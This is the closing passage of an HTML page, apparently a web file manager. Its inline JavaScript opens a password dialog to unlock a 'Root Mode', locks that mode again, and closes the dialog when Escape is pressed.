        }
        function jsRootClick() {
            const on = document.getElementById('rootBtn').classList.contains('fm-btn-root');
            if (on) {
                if (confirm('Disable Root Mode now?')) jsRootPost('lock');
            } else {
                document.getElementById('rootModal').classList.add('active');
                setTimeout(() => document.getElementById('rootPw').focus(), 60);
            }
        }
        function jsRootUnlock() {
            const pwEl = document.getElementById('rootPw');
            const pw = pwEl.value;
            if (!pw) { pwEl.focus(); return; }
            pwEl.value = '';
            jsRootPost('unlock', pw);
        }
        function jsRootLock() {
            document.getElementById('rootModal').classList.remove('active');
            jsRootPost('lock');
        }
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape' && document.getElementById('rootModal').classList.contains('active')) {
                document.getElementById('rootModal').classList.remove('active');
            }
        });
    </script>
</body>
</html>
